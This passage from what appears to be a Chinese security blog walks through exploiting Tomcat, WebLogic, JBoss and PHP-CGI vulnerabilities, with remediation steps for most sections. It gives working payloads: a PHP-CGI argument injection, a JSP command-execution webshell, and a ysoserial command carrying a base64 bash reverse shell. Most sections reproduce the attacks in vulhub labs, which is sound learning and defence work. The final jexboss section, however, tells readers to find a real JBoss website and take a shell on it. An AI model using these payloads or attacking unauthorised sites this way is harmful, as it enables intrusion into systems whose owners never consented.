&#39;&lt;?php echo `ls`; ?&gt;&#39;</code></pre><p><a href="https://image.3001.net/images/20181216/1544955594_5c1626ca98c2c.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955594_5c1626ca98c2c.png!small" alt="img"></a></p><p><strong>3、 漏洞修复</strong></p><p>更改默认端口</p><h3 id="（二）-PHPCGI远程代码执行"><a href="#（二）-PHPCGI远程代码执行" class="headerlink" title="（二） PHPCGI远程代码执行"></a>（二） PHPCGI远程代码执行</h3><p><strong>1、 漏洞简介及成因</strong></p><p>在apache调用php解释器解释.php文件时，会将url参数传我给php解释器，如果在url后加传命令行开关（例如-s、-d 、-c或-dauto_prepend_file%3d/etc/passwd+-n）等参数时，会导致源代码泄露和任意代码执行。</p><p>此漏洞影响php-5.3.12以前的版本，mod方式、fpm方式不受影响。</p><p><a href="http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/" target="_blank" rel="noopener">http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/</a><br>p牛讲的很详细：<a href="https://vulhub.org/#/environments/php/CVE-2012-1823/" target="_blank" rel="noopener">https://vulhub.org/#/environments/php/CVE-2012-1823/</a></p><p><strong>2、 漏洞复现</strong></p><p>cgi模式下有如下一些参数可用：</p><pre><code>-c 指定php.ini文件的位置-n 不要加载php.ini文件-d 指定配置项-b 启动fastcgi进程-s 显示文件源码-T 执行指定次该文件-h和-? 显示帮助</code></pre><p>通过使用<code>-d</code>指定<code>auto_prepend_file</code>来制造任意文件包含漏洞，执行任意代码：<br><code>auto_prepend_file</code>与<code>auto_append_file</code>:将文件require到所有页面的顶部与底部。<br>空格用<code>+</code>或<code>%20</code>代替，<code>=</code>用url编码代替。<br>payload：<code>-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input</code></p><p>使用vulhub实验环境，启动环境。</p><p>访问<a href="http://192.168.139.129:8080/index.php。" target="_blank" rel="noopener">http://192.168.139.129:8080/index.php。</a></p><p><a href="https://image.3001.net/images/20181216/1544955605_5c1626d552e60.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955605_5c1626d552e60.png!small" alt="img"></a></p><p>抓包，修改包。</p><p><a href="https://image.3001.net/images/20181216/1544955613_5c1626dd7ad9f.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955613_5c1626dd7ad9f.png!small" alt="img"></a></p><p>命令成功执行。</p><p><strong>3、 漏洞修复</strong></p><p>三种方法：</p><p>1）升级php版本；（php-5.3.12以上版本）;</p><p>2）在apache上做文章，开启url过滤，把危险的命令行参数给过滤掉，由于这种方法修补比较简单，采用比较多吧。</p><p>具体做法：</p><p>修改http.conf文件，找到<Directory/>增加以下三行</p><p>RewriteEngine on</p><p>RewriteCond %{QUERY_STRING} ^(%2d|-)[^=]+$ [NC]</p><p>RewriteRule ^(.*) $1? [L]</p><p>重启一下apache即可，但是要考虑到，相当于每次request就要进行一次url过滤，如果访问量大的话，可能会增加apache的负担。</p><p>3）打上php补丁。</p><p>补丁下载地址:<a href="https://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/" target="_blank" rel="noopener">https://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/</a></p>]]></content>
      
      
      <categories>
          
          <category> 其他中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FastCGI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat中间件漏洞</title>
      <link href="/2020/04/03/tomcat-zhong-jian-jian-lou-dong/"/>
      <url>/2020/04/03/tomcat-zhong-jian-jian-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="Tomcat中间件漏洞复现"><a href="#Tomcat中间件漏洞复现" class="headerlink" title="Tomcat中间件漏洞复现"></a>Tomcat中间件漏洞复现</h2><h4 id="Tomcat简介"><a href="#Tomcat简介" class="headerlink" title="Tomcat简介"></a>Tomcat简介</h4><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用 服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应 HTML （ 标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。</p><h4 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h4><h5 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><p>Tomcat 运行在Windows 主机上，且启用了 HTTP PUT 请求方法，可通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行。</p><p>影响版本： Apache Tomcat 7.0.0 – 7.0.81</p><h5 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h5><p>配置漏洞，开启put方法可上传文件功能。</p><p>tomcat文件夹下的/conf/web.xml文件插入：</p><pre><code>     &lt;init-param&gt;           &lt;param-name&gt;readonly&lt;/param-name&gt;           &lt;param-value&gt;false&lt;/param-value&gt;     &lt;/init-param&gt;</code></pre><p>重启tomcat服务。</p><p><a href="https://image.3001.net/images/20181216/1544955083_5c1624cb8ac8a.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955083_5c1624cb8ac8a.png!small" alt="img"></a></p><p>访问127.0.0.1：8080，burp抓包，send to Repeater，将请求方式改为PUT，创建一个122.jsp，并用%20转义空格字符。123.jsp内容为：</p><pre><code>&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%</code></pre><p>返回201，说明创建成功。</p><p><a href="https://image.3001.net/images/20181216/1544955095_5c1624d7b5447.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955095_5c1624d7b5447.png!small" alt="img"></a></p><p>访问127.0.0.1：8080/122.jsp?cmd=calc。</p><p>弹出计算器：</p><p><a href="https://image.3001.net/images/20181216/1544955107_5c1624e39d5ed.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955107_5c1624e39d5ed.png!small" alt="img"></a></p><p><strong>3、 漏洞修复</strong></p><p>1）检测当前版本是否在影响范围内，并禁用PUT方法。</p><p>2）更新并升级至最新版。</p><h3 id="（三）war后门文件部署"><a href="#（三）war后门文件部署" class="headerlink" title="（三）war后门文件部署"></a>（三）war后门文件部署</h3><p><strong>1、漏洞简介及成因</strong></p><p>Tomcat 支持在后台部署war文件，可以直接将webshell部署到web目录下。</p><p>若后台管理页面存在弱口令，则可以通过爆破获取密码。</p><p><strong>2、漏洞复现</strong></p><p>Tomcat安装目录下conf里的tomcat-users.xml配置如下：</p><p><a href="https://image.3001.net/images/20181216/1544955120_5c1624f0e6795.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955120_5c1624f0e6795.png!small" alt="img"></a></p><p>访问后台，登陆：</p><p><a href="https://image.3001.net/images/20181216/1544955131_5c1624fb87534.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955131_5c1624fb87534.png!small" alt="img"></a></p><p>上传一个war包，里面是jsp后门：</p><p><a href="https://image.3001.net/images/20181216/1544955146_5c16250a9c859.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955146_5c16250a9c859.png!small" alt="img"></a></p><p>成功上传并解析，打开：</p><p><a href="https://image.3001.net/images/20181216/1544955158_5c162516bfdc4.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955158_5c162516bfdc4.png!small" alt="img"></a></p><p>可执行系统命令：</p><p><a href="https://image.3001.net/images/20181216/1544955173_5c162525a51ea.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955173_5c162525a51ea.png!small" alt="img"></a></p><p>也可进行文件管理，任意查看、删除、上传文件：</p><p><a href="https://image.3001.net/images/20181216/1544955183_5c16252f655db.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955183_5c16252f655db.png!small" alt="img"></a></p><p><strong>3、漏洞修复</strong></p><p>1）在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。</p><p>2）增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制。</p><p>3）以及针对manager-gui/manager-status/manager-script等目录页面设置最小权限访问限制。</p><p>4）后台管理避免弱口令。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic中间件漏洞</title>
      <link href="/2020/04/03/weblogic-zhong-jian-jian-lou-dong/"/>
      <url>/2020/04/03/weblogic-zhong-jian-jian-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="WebLogic中间件漏洞复现"><a href="#WebLogic中间件漏洞复现" class="headerlink" title="WebLogic中间件漏洞复现"></a>WebLogic中间件漏洞复现</h2><h4 id="WebLogic简介"><a href="#WebLogic简介" class="headerlink" title="WebLogic简介"></a>WebLogic简介</h4><p>WebLogic是美国Oracle公司出品的一个applicationserver，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p><h4 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h4><h5 id="1-漏洞原理："><a href="#1-漏洞原理：" class="headerlink" title="1.漏洞原理："></a>1.漏洞原理：</h5><p>Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。</p><h5 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h5><p>使用vulhub实验环境，启动实验环境，访问靶机，抓包，修改数据包。</p><p><a href="https://image.3001.net/images/20181216/1544955349_5c1625d5f0cfb.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955349_5c1625d5f0cfb.png!small" alt="img"></a></p><p>Kali启动监听。</p><p>发送数据包成功后，拿到shell。</p><p><a href="https://image.3001.net/images/20181216/1544955361_5c1625e14f776.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955361_5c1625e14f776.png!small" alt="img"></a></p><p><strong>3、漏洞修复</strong></p><p>1）升级Oracle 10月份补丁。</p><p>2）对访问wls-wsat的资源进行访问控制。</p><h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>Weblogic 中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p><p><strong>2、 漏洞复现</strong></p><p>使用vulhub实验环境，启动环境。</p><p>访问<a href="http://192.168.139.129:7001/uddiexplorer/SearchPublicRegistries.jsp。" target="_blank" rel="noopener">http://192.168.139.129:7001/uddiexplorer/SearchPublicRegistries.jsp。</a></p><p><a href="https://image.3001.net/images/20181216/1544955373_5c1625edf3c4f.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955373_5c1625edf3c4f.png!small" alt="img"></a></p><p>用burp抓包，修改请求。</p><p><a href="https://image.3001.net/images/20181216/1544955383_5c1625f70b11d.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955383_5c1625f70b11d.png!small" alt="img"></a></p><p>启动nc监听2222端口。</p><p><a href="https://image.3001.net/images/20181216/1544955390_5c1625febc7e3.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955390_5c1625febc7e3.png!small" alt="img"></a></p><p>拿到shell。</p><h5 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h5><p>方法一：</p><p>以修复的直接方法是将SearchPublicRegistries.jsp直接删除就好了；</p><p>方法二：</p><p>1）删除uddiexplorer文件夹</p><p>2）限制uddiexplorer应用只能内网访问</p><p>方法三：（常用）</p><p>Weblogic服务端请求伪造漏洞出现在uddi组件（所以安装Weblogic时如果没有选择uddi组件那么就不会有该漏洞），更准确地说是uudi包实现包uddiexplorer.war下的SearchPublicRegistries.jsp。方法二采用的是改后辍的方式，修复步骤如下：</p><p>1）将weblogic安装目录下的wlserver_10.3/server/lib/uddiexplorer.war做好备份</p><p>2）将weblogic安装目录下的server/lib/uddiexplorer.war下载</p><p>3）用winrar等工具打开uddiexplorer.war</p><p>4)将其下的SearchPublicRegistries.jsp重命名为SearchPublicRegistries.jspx</p><p>5）保存后上传回服务端替换原先的uddiexplorer.war</p><p>6）对于多台主机组成的集群，针对每台主机都要做这样的操作</p><p>7）由于每个server的tmp目录下都有缓存所以修改后要彻底重启weblogic（即停应用–停server–停控制台–启控制台–启server–启应用）</p><h4 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h4><h5 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><p>通过访问config.do配置页面，先更改Work Home工作目录，用有效的已部署的Web应用目录替换默认的存储JKS Keystores文件的目录，之后使用”添加Keystore设置”的功能，可上传恶意的JSP脚本文件。</p><h5 id="2-漏洞复现-1"><a href="#2-漏洞复现-1" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h5><p>访问<a href="http://192.168.139.129:7001/ws_utc/config.do。" target="_blank" rel="noopener">http://192.168.139.129:7001/ws_utc/config.do。</a></p><p><a href="https://image.3001.net/images/20181216/1544955408_5c162610d485e.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955408_5c162610d485e.png!small" alt="img"></a></p><p>设置Work Home Dir为<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>。</p><p>然后点击安全 -&gt; 增加，然后上传 webshell ，这里我上传一个 jsp 大马。</p><p><a href="https://image.3001.net/images/20181216/1544955420_5c16261c14846.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955420_5c16261c14846.png!small" alt="img"></a></p><p>上传后，查看返回的数据包，其中有时间戳：</p><p><a href="https://image.3001.net/images/20181216/1544955428_5c16262471d61.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955428_5c16262471d61.png!small" alt="img"></a></p><p>可以看到时间戳为1543145154632。</p><p>访问<a href="http://192.168.139.129:7001/ws_utc/css/config/keystore/1543145154632_lele.jsp。" target="_blank" rel="noopener">http://192.168.139.129:7001/ws_utc/css/config/keystore/1543145154632_lele.jsp。</a></p><p>可以进行文件管理、文件上传、系统命令执行等。</p><p><a href="https://image.3001.net/images/20181216/1544955438_5c16262ed74a2.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955438_5c16262ed74a2.png!small" alt="img"></a></p><p>尝试以下执行系统命令。</p><p><a href="https://image.3001.net/images/20181216/1544955446_5c16263615970.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955446_5c16263615970.png!small" alt="img"></a></p><p>命令执行成功。</p><p><strong>3.漏洞修复</strong></p><p>方案1：</p><p>使用Oracle官方通告中的补丁链接：</p><p><a href="http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html</a></p><p><a href="https://support.oracle.com/rs?type=doc&amp;id=2394520.1" target="_blank" rel="noopener">https://support.oracle.com/rs?type=doc&amp;id=2394520.1</a></p><p>方案2:</p><p>1）进入Weblogic Server管理控制台；</p><p>2）domain设置中，启用”生产模式”。</p><h4 id="war后门文件部署"><a href="#war后门文件部署" class="headerlink" title="war后门文件部署"></a>war后门文件部署</h4><h5 id="1-漏洞原理：-1"><a href="#1-漏洞原理：-1" class="headerlink" title="1.漏洞原理："></a>1.漏洞原理：</h5><p>由于WebLogic后台存在弱口令，可直接登陆后台上传包含后门的war包。</p><h5 id="2-漏洞复现-2"><a href="#2-漏洞复现-2" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h5><p>访问<a href="http://192.168.139.129:7001/console" target="_blank" rel="noopener">http://192.168.139.129:7001/console</a></p><p><a href="https://image.3001.net/images/20181216/1544955458_5c162642c59ac.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955458_5c162642c59ac.png!small" alt="img"></a></p><p>使用弱口令登陆至后台。</p><p>点击锁定并编辑。</p><p><a href="https://image.3001.net/images/20181216/1544955467_5c16264b0e5ed.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955467_5c16264b0e5ed.png!small" alt="img"></a></p><p>选择部署，进一步点击右边的安装。</p><p><a href="https://image.3001.net/images/20181216/1544955476_5c162654ad096.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955476_5c162654ad096.png!small" alt="img"></a></p><p>点击上传文件 — 进入文件上传界面，选择要上传的 war 包。</p><p><a href="https://image.3001.net/images/20181216/1544955485_5c16265d47acf.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955485_5c16265d47acf.png!small" alt="img"></a></p><p>进入下一步，选择对应的 war 包进行部署，下一步下一步直至完成。</p><p><a href="https://image.3001.net/images/20181216/1544955495_5c16266778cf9.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955495_5c16266778cf9.png!small" alt="img"></a></p><p><a href="https://image.3001.net/images/20181216/1544955518_5c16267e4cdda.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955518_5c16267e4cdda.png!small" alt="img"></a></p><p><a href="https://image.3001.net/images/20181216/1544955523_5c1626831e3b3.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955523_5c1626831e3b3.png!small" alt="img"></a></p><p>点击激活更改。</p><p><a href="https://image.3001.net/images/20181216/1544955531_5c16268b6846b.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955531_5c16268b6846b.png!small" alt="img"></a></p><p>启动上传的 war 包所生成的服务。</p><p><a href="https://image.3001.net/images/20181216/1544955539_5c16269393d67.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955539_5c16269393d67.png!small" alt="img"></a></p><p>拿到 webshell。</p><p><a href="https://image.3001.net/images/20181216/1544955547_5c16269badc78.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955547_5c16269badc78.png!small" alt="img"></a></p><p><strong>3、 漏洞修复</strong></p><p>防火墙设置端口过滤，也可以设置只允许访问后台的IP列表，避免后台弱口令。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>jBoss中间件漏洞</title>
      <link href="/2020/04/03/jboss-zhong-jian-jian-lou-dong/"/>
      <url>/2020/04/03/jboss-zhong-jian-jian-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="jBoss中间件漏洞复现"><a href="#jBoss中间件漏洞复现" class="headerlink" title="jBoss中间件漏洞复现"></a>jBoss中间件漏洞复现</h2><h4 id="jBoss简介"><a href="#jBoss简介" class="headerlink" title="jBoss简介"></a>jBoss简介</h4><p>jBoss是一个基于J2EE的开发源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p><h4 id="JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）"><a href="#JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）" class="headerlink" title="JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）"></a>JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）</h4><p>这里直接复制了官方文档复现：<a href="https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149</a></p><p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p><p>参考：</p><ul><li><a href="https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg</a></li><li><a href="https://access.redhat.com/security/cve/cve-2017-12149" target="_blank" rel="noopener">https://access.redhat.com/security/cve/cve-2017-12149</a></li></ul><h5 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h5><p>运行测试环境</p><pre><code>docker-compose up -d</code></pre><p>首次执行时会有1~3分钟时间初始化，初始化完成后访问<code>http://your-ip:8080/</code>即可看到JBoss默认页面。</p><h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>该漏洞出现在<code>/invoker/readonly</code>请求中，服务器将用户提交的POST内容进行了Java反序列化：</p><p><a href="https://github.com/vulhub/vulhub/blob/master/jboss/CVE-2017-12149/img/1.png" target="_blank" rel="noopener"><img src="https://github.com/vulhub/vulhub/raw/master/jboss/CVE-2017-12149/img/1.png" alt="img"></a></p><p>所以，我们用常规Java反序列化漏洞测试方法来复现该漏洞。</p><p><strong>编写反弹shell的命令</strong></p><p>我们使用bash来反弹shell，但由于<code>Runtime.getRuntime().exec()</code>中不能使用管道符等bash需要的方法，我们需要用进行一次编码。</p><p>工具：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p><p><a href="https://github.com/vulhub/vulhub/blob/master/jboss/CVE-2017-12149/img/2.png" target="_blank" rel="noopener"><img src="https://github.com/vulhub/vulhub/raw/master/jboss/CVE-2017-12149/img/2.png" alt="img"></a></p><p><strong>序列化数据生成</strong></p><p>使用<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>来复现生成序列化数据，由于Vulhub使用的Java版本较新，所以选择使用的gadget是CommonsCollections5：</p><pre><code>java -jar ysoserial.jar CommonsCollections5 &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS8yMSAwPiYx}|{base64,-d}|{bash,-i}&quot; &gt; poc.ser</code></pre><p><strong>发送POC</strong></p><p>生成好的POC即为poc.ser，将这个文件作为POST Body发送至/invoker/readonly即可：</p><p><a href="https://github.com/vulhub/vulhub/blob/master/jboss/CVE-2017-12149/img/3.png" target="_blank" rel="noopener"><img src="https://github.com/vulhub/vulhub/raw/master/jboss/CVE-2017-12149/img/3.png" alt="img"></a></p><p>成功反弹shell：</p><p><a href="https://github.com/vulhub/vulhub/blob/master/jboss/CVE-2017-12149/img/4.png" target="_blank" rel="noopener"><img src="https://github.com/vulhub/vulhub/raw/master/jboss/CVE-2017-12149/img/4.png" alt="img"></a></p><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><p>网上已经有很多EXP了，比如<a href="https://cdn.vulhub.org/deserialization/DeserializeExploit.jar" target="_blank" rel="noopener">DeserializeExploit.jar</a></p><h5 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3 漏洞修复"></a>3 漏洞修复</h5><p>有效解决方案：升级到JBOSS AS7版本临时解决方案：</p><p>1）不需要http-invoker.sar 组件的用户可直接删除此组件；</p><p>2）用于对 httpinvoker 组件进行访问控制。</p><h4 id="war后门文件部署"><a href="#war后门文件部署" class="headerlink" title="war后门文件部署"></a>war后门文件部署</h4><h5 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><p>jBoss后台管理页面存在弱口令，通过爆破获得账号密码。登陆后台上传包含后门的war包。</p><p><strong>弱口令/未授权访问：</strong></p><p>admin/admin</p><p><strong>2、 漏洞复现</strong></p><p><a href="https://image.3001.net/images/20181216/1544955269_5c16258565dca.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955269_5c16258565dca.png!small" alt="img"></a></p><p><a href="https://image.3001.net/images/20181216/1544955275_5c16258b733e0.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955275_5c16258b733e0.png!small" alt="img"></a></p><p>点击Web Application(war)s。</p><p><a href="https://image.3001.net/images/20181216/1544955283_5c16259340980.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955283_5c16259340980.png!small" alt="img"></a></p><p>点击add a new resource。</p><p><a href="https://image.3001.net/images/20181216/1544955291_5c16259b4b362.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955291_5c16259b4b362.png!small" alt="img"></a></p><p>选择一个war包上传，上传后，进入该war包，点击start。</p><p><a href="https://image.3001.net/images/20181216/1544955300_5c1625a46f26a.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955300_5c1625a46f26a.png!small" alt="img"></a></p><p>查看status为sucessful。</p><p><a href="https://image.3001.net/images/20181216/1544955310_5c1625ae165ad.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955310_5c1625ae165ad.png!small" alt="img"></a></p><p>访问该war包页面，进入后门。</p><p>可进行文件管理和系统命令执行。</p><p><a href="https://image.3001.net/images/20181216/1544955318_5c1625b6d0f4c.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955318_5c1625b6d0f4c.png!small" alt="img"></a></p><p><a href="https://image.3001.net/images/20181216/1544955328_5c1625c0579fd.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955328_5c1625c0579fd.png!small" alt="img"></a></p><h3 id="使用kali复现"><a href="#使用kali复现" class="headerlink" title="使用kali复现"></a>使用kali复现</h3><p>参考链接：<a href="https://blog.csdn.net/u011215939/article/details/79141624" target="_blank" rel="noopener">https://blog.csdn.net/u011215939/article/details/79141624</a></p><p>所需工具：kallinux，jexboss，</p><p>获取工具：打开kalilinux，在kali终端中输入以下命令：</p><p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNTA4OTMxLTc1MzA2MTk4My5wbmc=.jpg" alt="img"></p><p>下载完成</p><p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNTAzNTExLTEwNzkzNTY3MDgucG5n.jpg" alt="img"></p><p>运行 python jexboss.py</p><p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNTQ5MzQ5LTE3NjgzMDY3ODYucG5n.jpg" alt="img"></p><p>检验是否能够执行，可以执行就是如下：</p><p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNTU5OTYwLTE2OTMyNzM0OTEucG5n.jpg" alt="img"></p><p>找一个jboos的网站，如图所示</p><p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNjA2Mjg0LTE1MzU0ODQxNTQucG5n.jpg" alt="img"></p><p>将这个IP:8080复制到kalilinux中使用jexboss工具进行检测；</p><p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNjQxMzA5LTE5MDI1MDExMzQucG5n.jpg" alt="img"></p><p>执行,工具会依次检测一下项目，有漏洞就会显示红色的：VULNERABLE(易受攻击的)，工具就会根据找到容易受到攻击的点，进行利用</p><p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNjQ5Njg0LTExNTA3Njc2MTcucG5n.jpg" alt="img"></p><p>然后选择yes，开始创建连接；</p><p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNjU3MTAwLTc0Nzg5ODU1Ni5wbmc=.jpg" alt="img"></p><p>返回信息显示连接成功了；</p><p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNzA0NzI2LTQ5ODI4NTQ5My5wbmc=.jpg" alt="img"></p><p>现在获取了shell，开始执行shell命令了；返回的信息显示，这是一个linux操作系统；</p><p><img 